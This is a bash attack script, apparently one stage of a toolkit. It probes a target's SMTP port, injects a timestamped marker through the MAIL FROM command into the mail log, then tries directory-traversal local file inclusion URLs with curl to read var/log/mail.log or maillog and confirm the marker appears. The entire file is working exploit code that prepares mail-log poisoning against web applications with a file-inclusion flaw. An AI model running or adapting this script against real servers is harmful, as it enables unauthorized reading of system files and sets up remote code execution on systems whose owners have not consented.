#!/bin/bash
# SMTP Canary Probe -- Phase 1: inject MAIL FROM marker into mail.log, verify via LFI
# 用法: canary_smtp.sh <ENDPOINT> <TARGET_IP>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:80}"
TARGET_IP="${2:-127.0.0.1}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
echo "=== SMTP Canary Probe (Phase 1) ==="

if ! (exec 3<>/dev/tcp/"$TARGET_IP"/25) 2>/dev/null; then
  echo "[SKIP] SMTP port 25 unreachable"
  echo "SMTP_CANARY_SKIP"
  exit 0
fi
exec 3>&- 3<&- 2>/dev/null || true

CANARY="SMTPCANARY$(date +%s)"
echo "[INFO] canary=$CANARY target=$TARGET_IP:25"
(printf 'EHLO x\r\nMAIL FROM:<%s>\r\nQUIT\r\n' "$CANARY" | \
  nc -w 3 "$TARGET_IP" 25 >/dev/null 2>&1) || true
sleep 2

CONFIRMED_PARAM="${lfi_param:-}"
CONFIRMED_DEPTH="${lfi_depth:-}"
LFI_STYLE="${lfi_style:-relative}"
LFI_PATH="${lfi_path:-}"
[ -z "$CONFIRMED_PARAM" ] && [ -z "$LFI_PATH" ] && CONFIRMED_PARAM="page"
[ -z "$CONFIRMED_DEPTH" ] && CONFIRMED_DEPTH="5"

build_lfi_url() {
  local target_file="$1"
  if [ "$LFI_STYLE" = "absolute" ]; then
    if [ -n "$LFI_PATH" ]; then
      echo "$BASE${LFI_PATH}/${target_file}"
    else
      echo "$BASE/?$CONFIRMED_PARAM=/${target_file}"
    fi
  else
    local TRAV
    TRAV=$(printf '../%.0s' $(seq 1 "$CONFIRMED_DEPTH"))
    if [ -n "$LFI_PATH" ]; then
      echo "$BASE${LFI_PATH}${TRAV}${target_file}"
    else
      echo "$BASE/?$CONFIRMED_PARAM=${TRAV}${target_file}"
    fi
  fi
}

MAIL_LOGS="var/log/mail.log var/log/maillog"
for logpath in $MAIL_LOGS; do
  url=$(build_lfi_url "$logpath")
  echo "[READ] $url"
  result=$(curl -s "$url" --max-time 8 2>/dev/null)
  if echo "$result" | grep -q "$CANARY"; then
    echo "[HIT] Canary echoed in $logpath"
    echo "SMTP_CANARY_OK:$logpath"
    exit 0
  fi
  sz=${#result}
  echo "[MISS] $logpath (${sz}B, no canary)"
done
echo "SMTP_CANARY_FAIL"
